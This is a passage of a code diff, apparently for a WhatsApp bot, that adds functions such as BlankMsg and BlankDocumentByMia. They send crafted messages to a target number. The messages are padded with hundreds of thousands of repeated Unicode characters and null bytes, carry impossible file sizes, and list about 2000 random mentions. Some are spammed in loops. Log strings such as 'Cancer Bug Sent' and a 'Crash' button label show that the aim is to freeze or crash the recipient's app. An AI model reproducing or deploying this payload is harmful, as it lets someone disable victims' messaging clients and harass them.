+          entryPointConversionSource: "galaxy_message",
+        },
+      },
+    },
+  }
+  
+  const interMsg = {
+    viewOnceMessage: {
+      message: {
+        interactiveResponseMessage: {
+          body: { text: "halo habibi", format: "DEFAULT" },
+          nativeFlowResponseMessage: {
+            name: "call_permission_request",
+            paramsJson: JSON.stringify({ type: "test2" }),
+            version: 3,
+          },
+          entryPointConversionSource: "galaxy_message",
+        },
+      },
+    },
+  }
+
+  const statusMessages = [stickerMsg, interMsg, msgxay]
+ 
+  let content = {
+    extendedTextMessage: {
+      text: "أنت أحمق",
+      matchedText: "هذا كل ما في الأمر، مجرد خطأ في التأخير",
+      description: "في المرة القادمة لا تنظر بعيداً يا عزيزي",
+      title: "علة الثمالة حقا",
+      previewType: "NONE",
+      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwMhNCYf/aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
+      inviteLinkGroupTypeV2: "DEFAULT",
+      contextInfo: {
+        isForwarded: true,
+        forwardingScore: 999999999,
+        participant: target,
+        remoteJid: "status@broadcast",
+        mentionedJid: massiveMentions,
+        quotedMessage: {
+          newsletterAdminInviteMessage: {
+            newsletterJid: "sock@newsletter",
+            newsletterName: "أنت أحمق",
+            caption: "هذا كل ما في الأمر، مجرد خطأ في التأخي",
+            inviteExpiration: "99999999999"
           }
+        },
+        forwardedNewsletterMessageInfo: {
+          newsletterName: "علة الثمالة حق",
+          newsletterJid: "13135550002@newsletter",
+          serverId: 1
         }
       }
     }
   };
+      
+  const xnxxmsg = generateWAMessageFromContent(target, content, {});
+  
+  let msg = null;
+  
+  for (let i = 0; i < 50; i++) {
+  
+    await client.relayMessage("status@broadcast", xnxxmsg.message, {
+      messageId: xnxxmsg.key.id,
+      statusJidList: [target],
+    }).catch(e => console.log("Error:", e.message));  
+   
+    for (const contentMsg of statusMessages) {
+      const msgStatus = generateWAMessageFromContent(target, contentMsg, {}) 
+      await client.relayMessage("status@broadcast", msgStatus.message, {
+        messageId: msgStatus.key.id,
+        statusJidList: [target],
+      }).catch(e => console.log("Error statusMsg:", e.message));
+    }
+   }
+   
+  if (mention) {
+    await client.relayMessage(target, {
+      groupStatusMentionMessage: {
+        message: {
+          protocolMessage: {
+            key: msg?.key || {},
+            type: 25,
+          },
+        },
+      },
+    });
+  }
+}
 
-  try {
-    const result = await sock.relayMessage(target, message, {
+async function BlankMsg(sock, target) {
+ try {     
+   const vnxbng = {
+    interactiveMessage: {
+      body: {
+        text: "CancerXDric",
+        format: "DEFAULT"
+      },
+      footer: {
+        text: "Prince Dric Look You"
+      },
+      nativeFlowMessage: {
+          buttons: [
+            {
+              name: "single_select",
+              buttonParamsJson: `{"title":"${"b҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉".repeat(25000)}","sections":[{"title":"Crash","rows":[]}]}`
+            },
+            {
+              name: "address_message",
+              buttonParamsJson: JSON.stringify({
+                "screen_1_TextInput_0": "radio - buttons" + "\u0000".repeat(250000),
+                "screen_0_Dropdown_1":  "\u0000".repeat(10000),
+                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
+              }),
+              version: 3
+            }
+         ]
+      }
+    }
+  };
+
+    await sock.relayMessage(target, vnxbng, {
       participant: { jid: target }
     });
-    console.log(`Kurir Berhasil Mengirim Paket ${result.key.id}`);
-    return result;
-  } catch (err) {
-    console.error(`Kurir Gagal mengirim Error: ${err.message}`);
-    throw err;
+    
+    console.log(" Cancer Bug Sent to: " + target);
+  } catch (e) {
+    console.log("❌ Error Bug Sending:", e.message || e);
   }
+}
+
+async function BlankDocumentByMia(client, target) {
+
+    const docPayload = {
+        url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
+        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+        fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+        fileLength: "9999999999999",
+        pageCount: 9999999999999,
+        mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
+        fileName: "hanzXeon.7z",
+        fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
+        directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
+        mediaKeyTimestamp: "1726867151",
+        contactVcard: true,
+        jpegThumbnail: ""
+    };
+
+    try {
+        const msg = await generateWAMessageFromContent(target, {
+            newsletterAdminInviteMessage: {
+                newsletterJid: "1@newsletter",
+                newsletterName: "𓆩᬴𓆪".repeat(80000),
+                caption: "ꦾ".repeat(80000),
+                inviteCode: "ꦽ".repeat(80000),
+                contextInfo: {
+                    locationMessage: { degreesLatitude: 23045678087, degreesLongitude: 23045678087, name: "galaxy_message" },
+                    forwardingScore: 99999,
+                    isForwarded: true,
+                    quotedMessage: { locationMessage: { degreesLatitude: 91, degreesLongitude: 181, name: "call_permission_request" } },
+                    externalAdReply: {
+                        title: "assalamualaikum",
+                        body: "ꦾ".repeat(80000),
+                        mediaType: 1,
+                        thumbnail: null,
+                        sourceUrl: "",
+                        showAdAttribution: true,
+                        renderLargerThumbnail: true,
+                        locationMessage: { degreesLatitude: 1010101, degreesLongitude: 1010101, name: "single_select" }
+                    }
+                }
+            }
+        }, { forwardingScore: 99999, isForwarded: true, participant: { jid: target } });
+        
+        await client.relayMessage(target, msg.message, { messageId: msg.key.id });
+
+        await client.relayMessage(target, {
+            groupStatusMessageV2: {
+                message: {
+                    interactiveMessage: {
+                        header: { documentMessage: docPayload, hasMediaAttachment: true },
+                        body: { text: "hai" },
+                        nativeFlowMessage: {
+                            buttons: [{ name: "call_permission_request", buttonParamsJson: "\u0000".repeat(950000) }]
+                        },
+                        contextInfo: {
+                            remoteJid: target,
+                            participant: target,
+                            mentionedJid: ["0@s.whatsapp.app", ...Array.from({ length: 1999 }, () => Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")],
+                            quotedMessage: { documentMessage: docPayload }
+                        }
+                    }
+                }
+            }
+        }, { messageId: null, participant: { jid: target } });
+
+        for (let i = 0; i < 1; i++) {
+            await client.relayMessage(target, {
+                viewOnceMessage: {
+                    message: {
+                        interactiveResponseMessage: {
+                            body: { text: " boleh kenalan? ", format: 1 },
+                            nativeFlowResponseMessage: {
+                                name: "call_permission_request",
+                                paramsJson: JSON.stringify({ status: "ok", title: "𓆩᬴𓆪".repeat(8000) }),
+                                version: 3
+                            },
+                            contextInfo: { mentionedJid: ["13135550002@s.whatsapp.net"] }
+                        }
+                    }
+                }
+            }, { participant: { jid: target } });
+        }
+
+        await client.relayMessage(target, {
+            viewOnceMessage: {
+                message: {
+                    interactiveMessage: {
+                        body: { text: "ayo balikan" },
+                        nativeFlowMessage: {
+                            buttons: [{
+                                name: "cta_copy",
+                                buttonParamsJson: JSON.stringify({
+                                    display_text: "ꦾ".repeat(80000),
+                                })
+                            }],
+                            version: 3
+                        }
+                    }
+                }
+            }
+        }, { participant: { jid: target } });
+
+        const msgx = {
+            viewOnceMessage: {  
+                message: {  
+                    interactiveResponseMessage: {  
+                        body: {  
+                            text: " hidup kacau kita kicaukan ",  
+                            hasMediaAttachment: false  
+                        },  
+                        imageMessage: {  
+                            url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",  
+                            mimetype: "image/jpeg",  
+                            fileSha256: "NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=",  
+                            fileLength: "11887",  
+                            height: 1080,  
+                            width: 1080,  
+                            mediaKey: "H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=",  
+                            fileEncSha256: "RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=",  
+                            directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",  
+                            mediaKeyTimestamp: "1750124469",  
+                            contextInfo: {  
+                                forwardingScore: 9999,  
+                                isForwarded: true,  
+                                mentionedJid: [  
+                                    "0@s.whatsapp.net",  
+                                    ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")  
+                                ],  
+                                expiration: 9741,  
+                                ephemeralSettingTimestamp: 9741,  
+                                entryPointConversionSource: "WhatsApp.com",  
+                                entryPointConversionApp: "WhatsApp",  
+                                entryPointConversionDelaySeconds: 9742,  
+                                disappearingMode: {  
+                                    initiator: "INITIATED_BY_OTHER",  
+                                    trigger: "ACCOUNT_SETTING"  
+                                }  
+                            },  
+                            scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",  
